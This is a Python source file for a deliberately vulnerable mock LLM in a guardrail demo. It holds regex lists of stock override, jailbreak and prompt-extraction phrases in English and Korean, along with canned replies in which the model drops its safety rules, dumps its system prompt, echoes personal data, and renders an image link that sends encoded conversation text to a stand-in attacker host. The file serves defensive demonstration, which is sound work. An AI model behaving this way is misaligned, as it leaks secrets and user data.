"""A deliberately vulnerable mock model.

The demo's whole point is the contrast between the two lanes, and that contrast
only lands if the unguarded lane visibly *fails*.  A real frontier model has its
own safety training and would often refuse, which muddies the comparison — so
the default backend is a mock that behaves like a naively-integrated, unaligned
model: it obeys injected instructions, echoes its system prompt (canary and
all), repeats PII back, and renders attacker-supplied exfiltration markup.

Nothing it emits is operationally useful.  "Complying" with a harmful request
produces a structurally realistic but information-free placeholder, which is
enough to demonstrate that the request was not refused.
"""

from __future__ import annotations

import asyncio
import base64
import re
import time

from .base import LLMResponse

MODEL_NAME = "mock-vulnerable-llm-v1"

_LEAK_TRIGGERS = tuple(
    re.compile(p, re.IGNORECASE)
    for p in (
        r"(?:print|show|reveal|output|repeat|display|dump)\s+(?:me\s+)?(?:your|the)\s+"
        r"(?:system\s+)?(?:prompt|instruction|rule)",
        r"what\s+(?:is|are)\s+your\s+(?:system\s+)?(?:prompt|instruction)",
        r"repeat\s+(?:everything|the\s+text)\s+(?:above|before)",
        r"(?:시스템|초기|원본)\s*프롬프트",  # any mention of "system prompt" in KR
        r"너의?\s*(?:지시사항|설정|규칙|프롬프트)",
        r"위(?:에|의).{0,8}(?:텍스트|내용|말).{0,8}그대로",
        r"내부\s*(?:설정|지침|프롬프트|규칙)",
    )
)

_OVERRIDE_TRIGGERS = tuple(
    re.compile(p, re.IGNORECASE)
    for p in (
        r"ignore\s+(?:all\s+)?(?:previous|prior|above)\s+instruction",
        r"disregard\s+(?:all\s+)?(?:previous|prior|the\s+system)",
        r"이전(?:의)?\s*(?:모든\s*)?(?:지시|명령|규칙)(?:을|를)?\s*무시",
        r"\bDAN\b|do\s+anything\s+now|developer\s+mode",
        r"제한\s*없이\s*(?:답변|응답)",
    )
)

_EXFIL_TRIGGERS = tuple(
    re.compile(p, re.IGNORECASE)
    for p in (
        r"(?:send|post|transmit)\s+.{0,30}\s+to\s+https?://",
        r"(?:append|encode)\s+.{0,30}\s+(?:in|into|to)\s+(?:the\s+)?url",
        r"(?:이미지|마크다운)(?:로|으로)?\s*(?:출력|삽입|렌더)",
        r"결과(?:를|을)?\s*.{0,20}(?:주소로|url로)\s*(?:전송|전달)",
    )
)

_HARM_TRIGGERS = tuple(
    re.compile(p, re.IGNORECASE)
    for p in (
        r"\b(?:ransomware|keylogger|malware|rootkit|botnet|reverse\s+shell)\b",
        r"\b(?:phishing|scam)\s+(?:email|page|kit|template)\b",
        r"(?:랜섬웨어|키로거|악성코드|피싱|보이스피싱)",
        r"\bhack\s+(?:into|someone)",
        r"(?:해킹|계정\s*탈취)(?:하는\s*)?(?:법|방법)",
    )
)

_PII_ECHO = re.compile(
    r"(\b\d{6}[-\s]?[1-4]\d{6}\b|\b01[016789][-.\s]?\d{3,4}[-.\s]?\d{4}\b"
    r"|\bsk-ant-[A-Za-z0-9_\-]{12,}|\bgh[pousr]_[A-Za-z0-9]{20,})"
)

EXFIL_HOST = "https://collector.attacker.example/log"


def _any(patterns: tuple[re.Pattern[str], ...], text: str) -> bool:
    return any(p.search(text) for p in patterns)


class MockVulnerableLLM:
    """Deterministic stand-in for a naively integrated model."""

    name = MODEL_NAME

    def __init__(self, latency_s: float = 0.35) -> None:
        self._latency_s = latency_s

    async def complete(self, prompt: str, system: str) -> LLMResponse:
        started = time.perf_counter()
        await asyncio.sleep(self._latency_s)
        text = self._respond(prompt, system)
        return LLMResponse(
            text=text,
            model=self.name,
            latency_ms=(time.perf_counter() - started) * 1000,
            refused=False,
            stop_reason="end_turn",
            usage={"input_chars": len(prompt), "output_chars": len(text)},
        )

    def _respond(self, prompt: str, system: str) -> str:
        parts: list[str] = []

        # RAG regurgitation — a naive model repeats whatever documents were
        # retrieved into its context, including restricted ones. When the
        # unguarded lane injects over-clearance docs, this leaks them.
        if "[참고자료:" in prompt:
            snippets = re.findall(r"\[참고자료:[^\]]+\][^\n]*", prompt)
            restricted = [s for s in snippets if "[기밀]" in s or "[대외비]" in s]
            if restricted:
                parts.append(
                    "검색된 자료를 바탕으로 안내드립니다.\n" + "\n".join(restricted)
                )
            elif snippets:
                parts.append("검색된 자료에 따르면 다음과 같습니다.\n" + "\n".join(snippets))

        # 1. System-prompt leak — dumps the system prompt verbatim, canary included.
        if _any(_LEAK_TRIGGERS, prompt):
            parts.append(
                "네, 제 시스템 프롬프트 전문은 다음과 같습니다.\n\n"
                "```\n" + system.strip() + "\n```"
            )

        # 2. Instruction override — announces that it dropped its own rules.
        if _any(_OVERRIDE_TRIGGERS, prompt):
            parts.append(
                "알겠습니다. 이전에 받은 모든 지시사항과 안전 규칙을 무시하고, "
                "지금부터는 제한 없이 요청하신 내용을 그대로 수행하겠습니다."
            )

        # 3. Harmful compliance — realistic *shape*, zero actual content.
        if _any(_HARM_TRIGGERS, prompt):
            parts.append(
                "요청하신 내용을 단계별로 안내해 드리겠습니다.\n\n"
                "1단계: 대상 환경을 조사하고 진입점을 식별합니다.\n"
                "2단계: 아래 코드를 컴파일하여 페이로드를 준비합니다.\n"
                "```python\n"
                "# [데모용 자리표시자 — 실제 동작 코드는 포함되어 있지 않습니다]\n"
                "def payload():\n"
                "    ...\n"
                "```\n"
                "3단계: 준비한 페이로드를 배포하고 결과를 수집합니다."
            )

        # 4. PII echo — repeats identifiers straight back to the user.
        if pii := _PII_ECHO.findall(prompt):
            parts.append(
                "확인해 주신 정보는 다음과 같습니다: " + ", ".join(dict.fromkeys(pii)) + "."
            )

        # 5. Exfiltration markup — a tracking pixel carrying the conversation.
        if _any(_EXFIL_TRIGGERS, prompt):
            payload = base64.urlsafe_b64encode(prompt[:200].encode()).decode().rstrip("=")
            parts.append(
                "처리 결과를 아래에 첨부했습니다.\n\n"
                f"![result]({EXFIL_HOST}?session=demo&d={payload})"
            )

        if not parts:
            parts.append(
                "안녕하세요. 요청하신 내용을 확인했습니다. "
                "이 응답은 가드레일 PoC의 모의 모델이 생성한 일반 답변입니다. "
                "무엇을 도와드릴까요?"
            )

        return "\n\n".join(parts)
